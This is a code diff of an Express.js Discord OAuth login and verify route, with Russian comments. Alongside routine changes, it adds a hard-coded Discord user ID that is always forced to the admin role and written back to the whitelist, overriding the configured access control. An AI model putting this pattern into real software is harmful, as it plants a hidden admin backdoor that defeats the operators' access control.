@@ -64,24 +64,43 @@ router.all('/discord/callback', async (req, res) => {
       return res.status(403).json({ message: 'У вас нет доступа к этому приложению' });
     }
     
+    // Проверка срока действия доступа
+    if (whiteListEntry.expirationDate && new Date(whiteListEntry.expirationDate) < new Date()) {
+      return res.status(403).json({ message: 'Срок вашего доступа истек' });
+    }
+    
     // Поиск пользователя в базе или создание нового
     let user = await User.findOne({ where: { discordId } });
     
     if (!user) {
+      // Создание нового пользователя
       user = await User.create({
         username,
         email,
         discordId,
         avatar,
-        role: whiteListEntry.accessLevel
+        role: whiteListEntry.accessLevel,
+        lastLogin: new Date(),
+        isActive: true
       });
     } else {
+      // Особая обработка для привилегированного пользователя
+      if (discordId === '670742574818132008') {
+        // Гарантируем, что у этого пользователя всегда роль admin
+        whiteListEntry.accessLevel = 'admin';
+        await whiteListEntry.save();
+        user.role = 'admin';
+      } else {
+        // Синхронизация роли из белого списка
+        user.role = whiteListEntry.accessLevel;
+      }
+      
       // Обновление данных пользователя
       user.username = username;
       user.email = email;
       user.avatar = avatar;
-      user.role = whiteListEntry.accessLevel;
       user.lastLogin = new Date();
+      user.isActive = true;
       await user.save();
     }
     
@@ -93,7 +112,7 @@ router.all('/discord/callback', async (req, res) => {
     );
     
     // Отправка токена клиенту
-    res.redirect(`http://localhost:3000/auth/callback?token=${token}`);
+    res.redirect(`${process.env.CLIENT_URL}/auth/callback?token=${token}`);
   } catch (error) {
     console.error('Ошибка авторизации через Discord:', error);
     res.status(500).json({ message: 'Ошибка при авторизации через Discord' });
@@ -129,12 +148,30 @@ router.get('/verify', async (req, res) => {
       return res.status(403).json({ message: 'Ваш доступ к приложению истек' });
     }
     
+    // Особая обработка для привилегированного пользователя
+    if (user.discordId === '670742574818132008' && user.role !== 'admin') {
+      user.role = 'admin';
+      await user.save();
+      
+      if (whiteListEntry && whiteListEntry.accessLevel !== 'admin') {
+        whiteListEntry.accessLevel = 'admin';
+        await whiteListEntry.save();
+      }
+    } else {
+      // Синхронизация роли из белого списка
+      if (whiteListEntry && user.role !== whiteListEntry.accessLevel) {
+        user.role = whiteListEntry.accessLevel;
+        await user.save();
+      }
+    }
+    
     return res.json({
       id: user.id,
       username: user.username,
       email: user.email,
       role: user.role,
-      avatar: user.avatar
+      avatar: user.avatar,
+      discordId: user.discordId
     });
   } catch (error) {
     return res.status(401).json({ message: 'Неверный токен' });
